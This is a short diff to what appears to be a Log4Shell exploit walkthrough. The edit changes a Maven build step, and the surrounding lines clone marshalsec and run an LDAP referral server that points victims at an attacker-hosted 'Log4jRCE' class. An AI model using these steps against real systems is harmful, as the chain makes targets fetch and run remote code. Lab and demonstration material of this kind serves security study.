@@ -43,7 +43,7 @@ format lookups and preventing further exploitation of this attack
 
    2.1 `git clone https://github.com/mbechler/marshalsec.git`
 
-   2.2 `mvn package`
+   2.2 `mvn package -DskipTests`
 
    2.3 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCE"`
 
